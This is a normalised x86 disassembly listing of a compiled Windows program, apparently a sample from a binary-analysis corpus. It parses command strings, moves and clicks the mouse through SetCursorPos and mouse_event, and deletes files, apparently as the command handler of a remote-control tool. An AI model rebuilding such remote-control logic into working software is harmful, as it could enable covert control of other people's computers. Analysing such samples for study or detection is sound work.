jle r-xdata
push r-xdata
lea eax [ ebp - 0x24 ]
call sub_3af2250
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_3af2c04
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_3af2e34
push [ ebp - 0x28 ]
push r-xdata
lea eax [ ebp - 0x2c ]
call sub_3af2f30
push [ ebp - 0x2c ]
push r-xdata
lea eax [ ebp - 0x30 ]
call sub_3af2ef8
push [ ebp - 0x30 ]
push r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebx + 0x374 ]
call sub_3aafb88
push [ ebp - 0x34 ]
push r-xdata
lea eax [ ebp - 0x1c ]
mov edx 0xb
call sub_3a65634
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
call sub_3af3d20
push r-xdata
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x38 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov [ rw-data ] 0x1
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov eax [ ebx + 0x37c ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x384 ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x388 ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x398 ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x39c ]
xor edx edx
call sub_3ae4b38
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov eax [ ebx + 0x37c ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x384 ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x388 ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x398 ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x39c ]
xor edx edx
call sub_3ae4b38
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x12
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
push rw-data
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebx + 0x388 ]
call sub_3ae4d34
mov eax [ ebx + 0x388 ]
mov dl 0x1
call sub_3ae4b38
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov eax [ ebx + 0x384 ]
xor edx edx
call sub_3ae4b38
mov eax [ ebx + 0x384 ]
mov dl 0x1
call sub_3ae4b38
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x9
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
lea eax [ ebp - 0x3c ]
call sub_3af20c8
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x14 ]
call sub_3a6556c
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call sub_3af2aec
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ rw-data ]
call sub_3a7d3f0
mov eax [ rw-data ]
call sub_3af35c0
mov eax [ ebx + 0x3a4 ]
call sub_3ae4d34
mov eax [ ebx + 0x3a4 ]
mov dl 0x1
call sub_3ae4b38
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x44 ]
call sub_3af2b70
mov ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov edx r-xdata
call sub_3a655b8
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x7
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3a69da8
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xb
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x4c ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x4c ]
call sub_3a699d8
mov esi eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x50 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x50 ]
call sub_3a699d8
push eax
push esi
call SetCursorPos
mov esi [ rw-data ]
mov esi [ esi ]
mov [ ebp - 0x48 ] esi
mov eax [ ebp - 0x48 ]
call sub_3a65730
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xa
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x54 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x54 ]
call sub_3a699d8
mov esi eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x58 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x58 ]
call sub_3a699d8
push eax
push esi
call SetCursorPos
push 0x0
push 0x0
push 0x0
push 0x0
push 0x2
call mouse_event
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x2
call mouse_event
push 0xa
call Sleep
push 0x0
push 0x0
push 0x0
push 0x0
push 0x4
call mouse_event
push 0xa
call Sleep
push 0x0
push 0x0
push 0x0
push 0x0
push 0x2
call mouse_event
push 0xa
call Sleep
push 0x0
push 0x0
push 0x0
push 0x0
push 0x4
call mouse_event
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xa
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x5c ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x5c ]
call sub_3a699d8
mov esi eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x60 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x60 ]
call sub_3a699d8
push eax
push esi
call SetCursorPos
push 0x0
push 0x0
push 0x0
push 0x0
push 0x4
call mouse_event
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xa
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x64 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x64 ]
call sub_3a699d8
mov esi eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x68 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x68 ]
call sub_3a699d8
push eax
push esi
call SetCursorPos
push 0x0
push 0x0
push 0x0
push 0x0
push 0x8
call mouse_event
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xa
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x6c ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x6c ]
call sub_3a699d8
mov esi eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x70 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x70 ]
call sub_3a699d8
push eax
push esi
call SetCursorPos
push 0x0
push 0x0
push 0x0
push 0x0
push 0x10
call mouse_event
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x9
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
xor eax eax
push ebp
push sub_3af4d06
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea edx [ ebp - 0x74 ]
mov eax [ ebp - 0x8 ]
call sub_3af2f68
mov edx [ ebp - 0x74 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0x78 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x78 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x84 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x84 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
push r-xdata
lea ecx [ ebp - 0x8c ]
mov edx r-xdata
mov eax [ rw-data ]
call sub_3af3378
push [ ebp - 0x8c ]
push r-xdata
lea eax [ ebp - 0x88 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x88 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
push r-xdata
lea edx [ ebp - 0x80 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x80 ]
push r-xdata
lea eax [ ebp - 0x7c ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x7c ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x9
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x8 ]
call sub_3a699d8
cmp eax 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x8
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
push r-xdata
lea ecx [ ebp - 0x110 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_3af3378
push [ ebp - 0x110 ]
push r-xdata
lea eax [ ebp - 0x10c ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x10c ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
jmp [ eax * 4 + jump_table_3af4e14 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xf
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a7d3f0
mov eax [ rw-data ]
call sub_3af35c0
mov eax [ ebx + 0x398 ]
call sub_3ae4d34
mov eax [ ebx + 0x398 ]
mov dl 0x1
call sub_3ae4b38
xor eax eax
push ebp
push sub_3af4f0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea edx [ ebp - 0x94 ]
xor eax eax
call sub_3a63350
mov eax [ ebp - 0x94 ]
lea edx [ ebp - 0x90 ]
call sub_3a69fb0
mov edx [ ebp - 0x90 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0x98 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0x98 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0x9c ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x9c ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push sub_3af4ff2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xa8 ]
call sub_3af1f0c
mov edx [ ebp - 0xa8 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xac ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xac ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xb0 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xb0 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xbc ]
call sub_3af1f74
mov edx [ ebp - 0xbc ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xc0 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xc4 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xd0 ]
call sub_3af1f74
mov edx [ ebp - 0xd0 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xd4 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xd4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xd8 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xd8 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push sub_3af52a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xe4 ]
call sub_3af20c8
mov edx [ ebp - 0xe4 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xe8 ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xe8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0xec ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xec ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
xor eax eax
push ebp
push j_sub_3a648a0#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
lea eax [ ebp - 0xf8 ]
call sub_3af1ea4
mov edx [ ebp - 0xf8 ]
mov eax rw-data
call sub_3a652f4
lea edx [ ebp - 0xfc ]
mov eax [ rw-data ]
call sub_3af2f68
mov edx [ ebp - 0xfc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0x100 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x100 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle sub_3af5608
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xc
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_3af2538
push r-xdata
lea edx [ ebp - 0xa4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xa4 ]
push r-xdata
lea eax [ ebp - 0xa0 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xa0 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xb8 ]
push r-xdata
lea eax [ ebp - 0xb4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xb4 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xcc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xcc ]
push r-xdata
lea eax [ ebp - 0xc8 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xc8 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xe0 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xe0 ]
push r-xdata
lea eax [ ebp - 0xdc ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xdc ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0xf4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0xf4 ]
push r-xdata
lea eax [ ebp - 0xf0 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0xf0 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push r-xdata
lea edx [ ebp - 0x108 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x108 ]
push r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x104 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov eax esi
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xd
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax rw-data
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov eax [ ebx + 0x39c ]
call sub_3ae4d34
mov eax [ ebx + 0x39c ]
mov dl 0x1
call sub_3ae4b38
sub_3af4d15
call sub_3a64cb0
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
push r-xdata
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0x84 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x84 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
push r-xdata
lea ecx [ ebp - 0x8c ]
mov edx r-xdata
mov eax [ rw-data ]
call sub_3af3378
push [ ebp - 0x8c ]
push r-xdata
lea eax [ ebp - 0x88 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x88 ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x9
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x8 ]
call sub_3a699d8
cmp eax 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x8
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
push r-xdata
lea ecx [ ebp - 0x110 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_3af3378
push [ ebp - 0x110 ]
push r-xdata
lea eax [ ebp - 0x10c ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x10c ]
mov eax [ ebp - 0x18 ]
call sub_3ae35c4
jmp [ eax * 4 + jump_table_3af4e14 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xf
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
